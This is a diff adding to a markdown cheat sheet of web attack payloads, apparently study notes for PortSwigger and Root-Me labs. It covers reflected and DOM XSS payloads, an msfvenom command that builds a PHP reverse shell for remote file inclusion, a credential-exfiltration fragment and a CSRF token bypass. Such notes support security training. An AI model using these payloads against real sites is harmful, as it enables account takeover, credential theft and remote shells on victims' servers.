@@ -50,6 +50,32 @@ body:username.value+':'+this.value
 
 `\'-alert(1)//`
 
+#### Reflected XSS into HTML context with all tags blocked except custom ones
+`<xss id="element-id" onclick="alert(1)" tabindex=1>#element-id`
+
+[Why we use tabIndex here?](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex)
+
+Why we add `#element-id` at the end?
+
+The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 
+
+#### Reflected XSS in canonical link tag
+[About canonical link tag](https://ahrefs.com/blog/canonical-tags/) -> We will exploit by break href attribute
+
+### Stored XSS
+
+
+### DOM XSS
+#### DOM XSS in `innerHTML`  sink using source `location.search`
+`<img src=1 onerror=alert(1)>`
+
+#### DOM XSS in jQuery selector sink using a change event
+`<iframe src="URL" onload="this.src+='xss'"></iframe>`
+
+#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+[XSS Angular JS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
+
+#### 
 # RFI
 ### Shell generation
 `msfvenom -p php/reverse_php lport=4444 lhost=<your ip > /path/to/shell`
@@ -92,7 +118,7 @@ Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-
 ```
 
 #### Token Bypass
-Sample payload for bypassing CSRF Token. Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)
+Sample payload for bypassing CSRF Token. Access [this challenge](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
 
 ```
 <script>
